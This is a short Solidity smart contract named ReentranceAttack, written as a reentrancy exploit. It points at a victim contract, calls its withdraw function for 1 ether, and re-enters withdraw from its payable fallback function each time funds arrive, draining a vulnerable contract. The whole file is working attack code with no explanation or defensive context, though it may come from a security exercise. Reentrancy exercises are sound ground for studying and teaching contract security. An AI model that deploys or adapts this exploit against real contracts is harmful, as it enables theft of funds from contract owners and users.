pragma solidity ^0.4.18;

contract ReentranceAttack {
    uint amount = 1 ether;
    address victim;

    function callWithdraw() internal {
        victim.call(bytes4(keccak256("withdraw(uint256)")), amount);
    }

    function attack(address _address) public {
        victim = _address;
        callWithdraw();
    }

    function () public payable {
        callWithdraw();
    }
}
